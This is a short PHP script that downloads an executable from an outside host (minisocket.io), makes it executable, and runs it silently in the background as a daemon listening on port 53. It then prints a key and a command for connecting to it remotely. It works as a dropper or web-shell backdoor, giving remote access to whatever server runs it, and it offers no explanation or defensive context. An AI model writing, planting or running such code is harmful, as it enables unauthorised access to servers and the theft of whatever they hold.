<?php
// Download binary
file_put_contents('ms', file_get_contents('https://minisocket.io/bin/mini-socketv2'));
chmod('ms', 0755);

// Generate session key
$S = trim(shell_exec('./ms -g'));

// Run with env vars
putenv("MINI_PORT=53");
putenv("MINI_ARGS=-s $S -d");
shell_exec('./ms > /dev/null 2>&1 &');

echo "Connect with: mini-ncv2 -s $S\n";
